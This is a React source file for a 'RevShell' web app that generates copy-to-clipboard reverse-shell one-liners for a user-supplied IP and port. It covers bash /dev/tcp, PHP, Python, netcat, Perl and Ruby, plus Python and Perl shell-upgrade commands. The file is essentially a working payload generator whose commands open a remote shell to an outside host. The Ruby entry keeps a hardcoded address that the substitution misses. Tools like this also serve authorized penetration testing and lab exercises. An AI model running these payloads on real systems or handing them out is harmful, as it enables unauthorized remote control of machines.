import React, { useState, useEffect } from "react";
import TextField from "@material-ui/core/TextField";
import CssBaseline from "@material-ui/core/CssBaseline";
import { MuiThemeProvider, createMuiTheme } from "@material-ui/core/styles";
import Container from "@material-ui/core/Container";
import { makeStyles } from "@material-ui/core/styles";
import Paper from "@material-ui/core/Paper";
import Grid from "@material-ui/core/Grid";
import Button from "@material-ui/core/Button";
import Snackbar from "@material-ui/core/Snackbar";
import IconButton from "@material-ui/core/IconButton";
import CloseIcon from "@material-ui/icons/Close";
import AllInclusiveIcon from "@material-ui/icons/AllInclusive";
import orange from "@material-ui/core/colors/orange";

const themeDark = createMuiTheme({
  palette: {
    type: "dark",
    primary: {
      main: "#FFFFFF",
    },
    text: {
      primary: "#FFFFFF",
    },
    secondary: {
      main: "#FFFFFF",
    },
  },
});
const useStyles = makeStyles((theme) => ({
  root: {
    flexGrow: 1,
    "& .MuiTextField-root": {
      margin: theme.spacing(1),
      textAlign: "center",
      justifyContent: "center",
      alignItems: "center",
      marginLeft: "auto",
      marginRight: "auto",
      width: "25ch",
    },
  },
  paper: {
    padding: theme.spacing(1),
    textAlign: "center",
    color: themeDark.palette.text.primary,
  },
}));
const App = () => {
  const classes = useStyles();
  const [ip, setIp] = useState("10.10.10.10");
  const [port, setPort] = useState(1337);
  const [mylist, setMylist] = useState([]);

  const [open, setOpen] = React.useState(false);
  useEffect(() => {
    generateList();
  }, [ip, port]);
  const handleClick = () => {
    setOpen(true);
  };

  const handleClose = (event, reason) => {
    if (reason === "clickaway") {
      return;
    }

    setOpen(false);
  };
  const generateList = () => {
    console.log(ip);
    setMylist(
      list.map((item) => {
        return {
          name: item.name,
          value: item.value.replace("MYIP", ip).replace("MYPORT", port),
        };
      })
    );
  };
  const copyToClipboard = (e, item) => {
    navigator.clipboard.writeText(item.value);
    handleClick();
  };
  const mylist2 = [
    {
      name: "Python 2",
      value: `python -c 'import pty; pty.spawn("/bin/bash")'`,
    },
    {
      name: "Python 3",
      value: `python3 -c 'import pty; pty.spawn("/bin/bash")'`,
    },
    {
      name: "Bash",
      value: `echo os.system('/bin/bash')`,
    },
    {
      name: "Perl",
      value: `perl -e 'exec "/bin/bash";'`,
    },
  ];
  const list = [
    {
      name: "Bash",
      value: "bash -i >& /dev/tcp/MYIP/MYPORT 0>&1",
    },
    {
      name: "PHP",
      value: `php -r '$sock=fsockopen("MYIP",MYPORT);exec("/bin/sh -i <&3 >&3 2>&3");'`,
    },
    {
      name: "Python",
      value: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MYIP",MYPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
    },
    {
      name: "NC v1",
      value: `nc -e /bin/sh MYIP MYPORT`,
    },
    {
      name: "NC v2",
      value: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc MYIP MYPORT >/tmp/f`,
    },
    {
      name: "Perl",
      value: `perl -e 'use Socket;$i="MYIP";$p=MYPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
    },
    {
      name: "Ruby",
      value: `ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    },
  ];
  const FormRow = ({ item }) => {
    return (
      <React.Fragment>
        <Grid item xs={12}>
          <div>
            {item.name}
            <Paper
              elevation={3}
              className={classes.paper}
              onClick={(e) => copyToClipboard(e, item)}
            >
              {item.value}
            </Paper>
          </div>
        </Grid>
      </React.Fragment>
    );
  };

  return (
    <MuiThemeProvider theme={themeDark}>
      <CssBaseline />
      <Container maxWidth="lg">
        <h1>
          RevShell <AllInclusiveIcon />
        </h1>
        <form className={classes.root}>
          <TextField
            color="secondary"
            id="outlined-multiline-flexible"
            multiline
            label="IP Address"
            variant="outlined"
            InputLabelProps={{
              shrink: true,
            }}
            value={ip}
            onChange={(e) => setIp(e.target.value)}
          />
          <TextField
            color="secondary"
            id="outlined-multiline-flexible"
            multiline
            label="Port"
            variant="outlined"
            InputLabelProps={{
              shrink: true,
            }}
            value={port}
            onChange={(e) => setPort(e.target.value)}
          />
        </form>
        <Grid container spacing={1}>
          <Grid container item spacing={1}>
            {mylist.map((item) => (
              <FormRow item={item} />
            ))}
          </Grid>
        </Grid>
        <br />
        <h2>Shell Upgrade</h2>
        <Grid container spacing={1}>
          <Grid container item spacing={1}>
            {mylist2.map((item) => (
              <FormRow item={item} />
            ))}
          </Grid>
        </Grid>
        <Snackbar
          anchorOrigin={{
            vertical: "top",
            horizontal: "right",
          }}
          open={open}
          autoHideDuration={2000}
          onClose={handleClose}
          message="Saved to clipboard"
          action={
            <React.Fragment>
              <IconButton
                size="small"
                aria-label="close"
                color="inherit"
                onClick={handleClose}
              >
                <CloseIcon fontSize="small" />
              </IconButton>
            </React.Fragment>
          }
        />
      </Container>
    </MuiThemeProvider>
  );
};
export default App;
